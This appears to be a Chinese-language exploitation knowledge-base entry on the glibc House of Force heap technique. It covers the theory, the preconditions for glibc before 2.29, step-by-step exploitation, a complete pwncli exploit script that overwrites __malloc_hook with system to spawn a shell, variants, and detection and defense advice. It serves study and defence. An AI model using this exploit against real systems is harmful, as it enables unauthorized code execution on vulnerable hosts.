---
id: binary-pwn-heap-house-of-force-topchunk-to-malloc-hook
title: House of Force：改 top chunk size 为极大值后一次任意大小申请把 top 挪到 __malloc_hook，再申请写入 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-force-topchunk-malloc-hook
aliases:
- House of Force
- 攻打 top chunk size
- top chunk 任意位置分配
- 8 字节溢出改 top size
- 大数值申请挪 top
- glibc 2.29 之前的任意分配
tags:
- pwn
- heap
- glibc
- glibc227
- top-chunk
- house-of-force
- malloc-hook
- arbitrary-alloc
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:31:36+08:00'
  notes: 已对照原文核对；本次核对未读取图片；原文一致处：off-by-8(read size+8)改top size为0xfffffff20c08、size=__malloc_hook-0x20-heapbase-0x350抬top、top落入__memalign_hook/__malloc_hook之间、再申请写入system并以/bin/sh地址触发、2.29修补/2.29前可用；完整exp与原文一致
---

## 一句话结论

只要程序允许「用堆溢出改写 top chunk 的 `size`」且「申请大小完全由用户输入决定」，就能把 top size 改成接近 `SIZE_MAX` 的极大值，然后用一次精心计算过的大数值申请把 top chunk 抬到 `__malloc_hook - 0x20` 附近，下一次申请即返回该地址，写入 `system` 后再以 `"/bin/sh"` 地址作为「申请大小」触发 hook，直接拿 shell；这是 glibc 2.29 加入 top size 合理性检查之前的经典任意分配打法。

## 原理

- `_int_malloc` 走 `use_top` 分支时只做一件事：把 `nb`（请求大小对齐后）从 top chunk 切走，返回 `victim = top`，并把新的 top 更新为 `victim + nb`。它**不做**「新 top 是否仍在堆内」的检查（2.29 之前），只校验 `size > av->system_mem` 之类的粗粒度条件。
- 因此只要 top 的 `size` 字段足够大（能通过 `nb + MINSIZE <= size` 的判断），攻击者就能选一个 `nb`，让 `top + nb` 落在**任意地址**。这个 `nb` 是一个普通整数，由程序里的 `malloc(用户输入)` 直接传入——不需要溢出、不需要伪造链表，一次申请就能完成。
- 目标通常选 `__malloc_hook`（`main_arena` 附近，地址固定偏移于 libc 基址）。为了让下一次申请正好返回 hook，本次要落到 `__malloc_hook - 0x20`：因为切走 `nb` 后新 top 从 `victim + nb` 起算，而 `malloc` 返回的是新 top 本身，中间还要跨过 chunk 头（`0x10`）与对齐，具体偏移按目标 libc 实测微调。
- 触发环节同样省事：`__malloc_hook` 的调用发生在 `malloc` 入口，参数就是用户传入的 size。把 `"/bin/sh"` 字符串的地址当作 size 传进去（`strtoul` 会把这个十进制数字解析成同一个值），hook 被调用时 `rdi` 正好是该地址，等价于 `system("/bin/sh")`。
- 两个必要前提常被忽略：**必须同时泄露 libc（定 hook 地址）和 heap（定当前 top 起点）**；以及 `size` 字段的那 8 字节必须能通过溢出写到 top 上（本例是「申请 N 字节但 `read(N+8)`」的 off-by-8）。

## 触发条件

- glibc < 2.29（2.29 起 `_int_malloc` 对 top size 增加了 `size <= av->system_mem` 与对齐/上限检查，该打法失效）。
- 能覆盖 top chunk 的 `size` 字段（堆溢出/off-by-one 写到 top 头部即可）。
- `malloc` 的大小参数完全由用户输入控制（含 `strtoul` 之类的无上限解析），且能申请到极大值而不被上层逻辑拦。
- 已泄露 libc 基址与堆基址（用于计算落点）。
- `__malloc_hook` 仍存在且在 `malloc` 时被调用（glibc < 2.34）。

## 利用步骤

1. 泄露 libc：用未初始化缓冲区或 unsorted bin 等手段拿到一个 libc 指针，`libc.address = leak - offset`。
2. 泄露 heap：让某个已释放的 tcache chunk 被当作字符串打印（或以其它方式读出其 `fd`），得到堆地址，`heapbase = leak2 - offset`；这一步决定后面「top 距 hook 有多远」。
3. 溢出改 top size：先申请一个小块，用 off-by-8（`read(size+8)`）在其后紧邻的 top chunk 头部写入 `size` 字段为极大值（如 `0xfffffff20c08`）。注意要保持最低位的 `PREV_INUSE` 标志与对齐要求。
4. 计算并执行「抬 top」的申请：`nb = __malloc_hook - 0x20 - heapbase - <当前 top 到 heapbase 的偏移>`，把这个十进制数作为 size 提交；本次 `malloc` 返回一块随意的内存（内容无关），但 top 已被挪到 hook 前。
5. 覆写 hook：再申请一次同样大小（或刚好落位的大小），返回地址即 `__malloc_hook`，写入 `p64(system)`。
6. 触发：再次申请，size 字段填 `"/bin/sh"` 字符串地址的十进制值，`malloc` → `__malloc_hook` → `system("/bin/sh")`。
7. 验证：本地 gdb 观察 `top_chunk` 地址是否已落在 `__memalign_hook`/`__malloc_hook` 之间（原文调试输出即为此形态），再核对 `__malloc_hook` 是否被写成 `system`。

## PoC

```python
from pwncli import *
cli_script()
io, elf, libc = gift.io, gift.elf, gift.libc

# 1) libc 泄露（示例：未初始化栈缓冲区被 %s 打印）
sla(b"> ", b"1")
sa(b": ", cyclic(56))
ru(cyclic(56))
libc.address = unpack(rl()[:-1], "all") - 0x64f44

# 2) heap 泄露（示例：释放后用「Welcome %s」打印残留 fd）
sla(b": ", b"n")
sla(b"> ", b"2"); sla(b"> ", b"22")
sla(b"> ", b"3")
ru(b"Welcome ")
heapbase = unpack(rl()[:-2], "all") - 0x260

# 3) 溢出 top chunk 的 size 字段为极大值（off-by-8：申请 24 写 32）
sla(b"> ", b"1"); sla(b": ", b"24")
sa(b": ", cyclic(24) + pack(0xfffffff20c08))

# 4) 抬 top 到 __malloc_hook - 0x20
size = libc.sym.__malloc_hook - 0x20 - heapbase - 0x350
sla(b"> ", b"1"); sla(b": ", str(size).encode()); sla(b": ", pack(0xdeadbeef))

# 5) 落到 hook 上写 system
sla(b"> ", b"1"); sla(b": ", b"24"); sla(b": ", pack(libc.sym.system))

# 6) 以 /bin/sh 地址为参数触发
sla(b"> ", b"1"); sla(b": ", str(next(libc.search(b"/bin/sh"))).encode())
ia()
```

## 变体与关联

- **变体一**：目标不是 `__malloc_hook` 而是可控的全局函数指针/`.bss` 上的结构体——只要该地址在 libc/heap 已知范围内，同样一次挪 top 就能覆盖；2.34+ 无 hook 时这条思路转向 `_IO_list_all`、`__exit_funcs` 等。
- **变体二**：没有 heap 泄露时，用「top size 改动量」做差分成相对定位，或改打与 heap 无固定偏移关系的目标（如已知 PIE 基址的 `.bss`）来绕开对 heap 地址的依赖。
- **变体三**：只能改到 top size 的低字节时，配合 `sysmalloc` 触发释放旧 top（House of Peach 一类），得到 unsorted/largebin 攻击面而不是直接任意分配。
- **关联**：[[binary-pwn-heap-uninit-stack-buffer-leak-tcache-dup-malloc-hook]]（同一程序的另一条解：用 tcache dup 打同一个 `__malloc_hook`；本条走 top chunk，不需要伪造链表，但需要 heap 泄露与极大 size 申请）、[[binary-pwn-heap-house-of-peach-top-chunk-sysmalloc-largebin]]（同为 top chunk size 篡改，方向是借 `sysmalloc` 释放旧 top）、[[binary-pwn-heap-house-of-orange-fastbin-got-onegadget]]（同为「无 free 时改 top size + 大块申请」，但配合 house_of_orange 走 fastbin）。

## 检测与防御

- 升级 glibc 到 2.29+（top size 合理性检查）与 2.34+（移除 malloc/free hook），这两层任一到位都能让该链断开。
- 代码侧：`malloc` 的大小参数做上限校验（拒绝异常巨大的请求），并对「读入长度」与「已分配大小」严格一致（消除 off-by-8/写越界）。
- 检测：进程内出现异常巨大的 `malloc` 请求（几十 TB 量级）、`top_chunk` 落到 `main_arena` 附近、`__malloc_hook`/`__free_hook` 被写入非 NULL 值；malloc 后立即 execve 的行为序列。
